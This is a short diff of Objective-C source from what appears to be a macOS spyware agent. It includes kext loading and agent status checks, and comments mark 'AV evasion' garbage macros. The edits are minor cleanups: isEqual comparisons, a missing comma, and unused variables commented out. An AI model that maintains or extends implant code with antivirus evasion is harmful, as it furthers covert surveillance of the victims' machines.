@@ -1732,8 +1732,8 @@ void decryptAndSaveIm()
             // AV evasion: only on release build
             AV_GARBAGE_009
             
-            if ([agentConfiguration objectForKey: @"status"]    == AGENT_RUNNING
-                || [agentConfiguration objectForKey: @"status"] == AGENT_START)
+            if ([[agentConfiguration objectForKey: @"status"] isEqual: AGENT_RUNNING]
+                || [[agentConfiguration objectForKey: @"status"] isEqual: AGENT_START])
             {
 #ifdef DEBUG_CORE
                 if (x == 0)
@@ -2576,7 +2576,7 @@ void decryptAndSaveIm()
                          IM_NAME,
                          IM_NAME,
                          IM_EXT,
-                         IM_CONTENTS
+                         IM_CONTENTS,
                          IM_MACOS];
     
     if ([self createFolder: imResources] == FALSE)
@@ -4097,7 +4097,9 @@ void decryptAndSaveIm()
     // AV evasion: only on release build
     AV_GARBAGE_000
     
-    BOOL sliSuccess = NO, uiSuccess = NO, noPrivs = NO;
+    //BOOL sliSuccess = NO; // J: unused
+    //BOOL uiSuccess = NO;  // J: unused
+    //BOOL noPrivs = NO;    // J: unused
     
     // Check the preconfigured mode - default is SLIPLIST
 #ifdef DEV_MODE
@@ -4338,7 +4340,7 @@ void decryptAndSaveIm()
                            withObject: nil];
     
 #ifndef NO_KEXT
-    int ret = 0;
+    //int ret = 0;  //J: unused
     int kextLoaded = 0;
     
     // AV evasion: only on release build
